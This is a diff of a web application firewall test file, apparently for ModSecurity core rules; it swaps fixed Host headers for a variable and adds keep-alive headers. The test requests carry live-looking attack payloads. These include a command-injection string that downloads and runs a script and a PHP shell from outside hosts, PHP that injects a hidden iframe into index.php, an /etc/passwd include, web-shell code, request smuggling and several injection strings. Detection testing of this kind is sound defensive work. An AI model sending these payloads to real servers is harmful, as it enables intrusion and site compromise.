@@ -7,12 +7,14 @@
 %var command=http://ricky.ilmerlodellarocca.com/upload.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;%20appa.jpg;perl%20appa.jpg;rm%20-rf%20appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;mv%20ca.php%20ca.php;chmod%20755%20ca.php
 %request
 GET /?foo=$command HTTP/1.0
-Host: local
+Host: $hostname
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
 Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 %test Injection of Undocumented ColdFusion Tags (950008)
@@ -22,12 +24,14 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 %var cf_command=%3CCFINTERNALDEBUG%20ACTION%3D%22pcode%22%20OUTVAR%3D%22r_var%22%20TEMPLATEPATH%3D%22%23template%23%22%3E
 %request
 GET /?foo=$cf_command HTTP/1.0
-Host: local
+Host: $hostname
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
 Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -39,11 +43,13 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 %var ldap_command=(&(objectClass=*)(objectClass=resources)) 
 %request
 GET /?foo=$ldap_command HTTP/1.0
-Host: local
+Host: $hostname
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -54,11 +60,13 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 %var ssi_command=%3C!--%23include%20virtual%3D%22%2Fetc%2Fpasswd%22%20--%3E
 %request
 GET /?foo=$ssi_command HTTP/1.0
-Host: local
+Host: $hostname
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -68,11 +76,13 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 %var updf=http%3A%2F%2Fwww.example.com%2Ffile.pdf%23a%3Djavascript%3Aalert('Alert')
 %request
 GET /?foo=$updf HTTP/1.0
-Host: local
+Host: $hostname
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -81,12 +91,14 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 %output 950019
 %request
 POST / HTTP/1.0
-Host: local
+Host: $hostname
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
 Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: $CONTENT_LENGTH
 
@@ -98,7 +110,7 @@ body=email@anonymous.xxx%0ATo:email1@who.xxx
 %output 950012
 %request
 GET / HTTP/1.0
-Host: local
+Host: $hostname
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
 Accept-Language: en-us,en;q=0.5
@@ -106,6 +118,8 @@ Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 Transfer-Encoding: utf-8
 Transfer-Encoding: utf-8
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 %test HTTP Request Smuggling (950012)
@@ -113,13 +127,15 @@ Transfer-Encoding: utf-8
 %output 950012
 %request
 POST / HTTP/1.0
-Host: local
+Host: $hostname
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
 Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 Content-Type: application/x-www-form-urlencoded
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 Content-Length: 3
 Content-Length: 3
 
@@ -136,9 +152,9 @@ Referer: http://www.mummy.com/index.html
 Accept-Language: zh-sg
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
-Host: www.mummy.com
-Connection: Keep-Alive
-Cache-Control: no-cache
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -152,9 +168,9 @@ Referer: http://www.mummy.com/index.html
 Accept-Language: zh-sg
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
-Host: www.mummy.com
-Connection: Keep-Alive
-Cache-Control: no-cache
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -168,9 +184,9 @@ Referer: http://www.mummy.com/index.html
 Accept-Language: zh-sg
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
-Host: www.mummy.com
-Connection: Keep-Alive
-Cache-Control: no-cache
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -187,9 +203,9 @@ Referer: http://www.mummy.com/index.html
 Accept-Language: zh-sg
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
-Host: www.mummy.com
-Connection: Keep-Alive
-Cache-Control: no-cache
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 %test Remote File Inclusion Attack (950119)
@@ -205,9 +221,9 @@ Referer: http://www.mummy.com/index.html
 Accept-Language: zh-sg
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
-Host: www.mummy.com
-Connection: Keep-Alive
-Cache-Control: no-cache
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -225,8 +241,8 @@ Accept-Language: zh-sg
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
 Host: www.victim.com
-Connection: Keep-Alive
-Cache-Control: no-cache
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 %test Session Fixation Attack (950009)
@@ -239,9 +255,9 @@ Referer: http://www.mummy.com/index.html
 Accept-Language: zh-sg
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
-Host: www.victim.com
-Connection: Keep-Alive
-Cache-Control: no-cache
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -254,9 +270,9 @@ Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-
 Accept-Language: zh-sg
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
-Host: www.victim.com
-Connection: Keep-Alive
-Cache-Control: no-cache
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -270,10 +286,10 @@ Accept-Language: zh-sg
 Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
-Host: www.victim.com
+Host: $hostname
 Referer: http://forum.antichat.ru/forum127.html
-Connection: Keep-Alive
-Cache-Control: no-cache
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -290,9 +306,9 @@ Accept-Language: zh-sg
 Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
-Host: www.victim.com
-Connection: Keep-Alive
-Cache-Control: no-cache
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -307,9 +323,9 @@ Accept-Language: zh-sg
 Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
-Host: www.victim.com
-Connection: Keep-Alive
-Cache-Control: no-cache
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -320,12 +336,14 @@ Cache-Control: no-cache
 %var command=http://ricky.ilmerlodellarocca.com/upload.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;%20appa.jpg;perl%20appa.jpg;rm%20-rf%20appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;mv%20ca.php%20ca.php;chmod%20755%20ca.php
 %request
 GET /?foo=$command HTTP/1.0
-Host: local
+Host: $hostname
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
 Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -337,12 +355,14 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 %var command=%3C%3Fphp%20echo(%5C%22KURWA%5C%22)%3B%20file_put_contents(%5C%22.%2Findex.php%5C%22%2C%20base64_decode(%5C%22Pz48aWZyYW1lIHNyYz0iaHR0cDovL3p1by5wb2Rnb3J6Lm9yZy96dW8vZWxlbi9pbmRleC5waHAiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIGZyYW1lYm9yZGVyPSIwIj48L2lmcmFtZT48P3BocA%3D%3D%5C%22)%2C%20FILE_APPEND)%3B%20%3F%3E
 %request
 GET /?foo=$command HTTP/1.0
-Host: local
+Host: $hostname
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
 Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 
 
 
@@ -353,12 +373,14 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 %var php_code=echo%20sr(15%2C%22%3Cb%3E%22.%24lang%5B%24language.'_text16'%5D.%24arrow.%22%3C%2Fb%3E%22%2C%22%3Cselect%20name%3D%5C%22method%5C%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Coption%20value%3D%5C%22system%5C%22%20%3C%3F%20if%20(%24method%3D%3D%5C%22system%5C%22)%20%7B%20echo%20%5C%22selected%5C%22%3B%20%7D%20%3F%3Esystem%3C%2Foption%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Coption%20value%3D%5C%22passthru%5C%22%20%3C%3F%20if%20(%24method%3D%3D%5C%22passthru%5C%22)%20%7B%20echo%20%5C%22selected%5C%22%3B%20%7D%20%3F%3Epassthru%3C%2Foption%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Coption%20value%3D%5C%22exec%5C%22%20%3C%3F%20if%20(%24method%3D%3D%5C%22exec%5C%22)%20%7B%20echo%20%5C%22selected%5C%22%3B%20%7D%20%3F%3Eexec%3C%2Foption%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Coption%20value%3D%5C%22shell_exec%5C%22%20%3C%3F%20if%20(%24method%3D%3D%5C%22shell_exec%5C%22)%20%7B%20echo%20%5C%22selected%5C%22%3B%20%7D%20%3F%3Eshell_exec%3C%2Foption%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Coption%20value%3D%5C%22popen%5C%22%20%3C%3F%20if%20(%24method%3D%3D%5C%22popen%5C%22)%20%7B%20echo%20%5C%22selected%5C%22%3B%20%7D%20%3F%3Epopen%3C%2Foption%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Coption%20value%3D%5C%22proc_open%5C%22%20%3C%3F%20if%20(%24method%3D%3D%5C%22proc_open%5C%22)%20%7B%20echo%20%5C%22selected%5C%22%3B%20%7D%20%3F%3Eproc_open%3C%2Foption%3E
 %request
 POST / HTTP/1.0
-Host: local
+Host: $hostname
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
 Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: $CONTENT_LENGTH
 
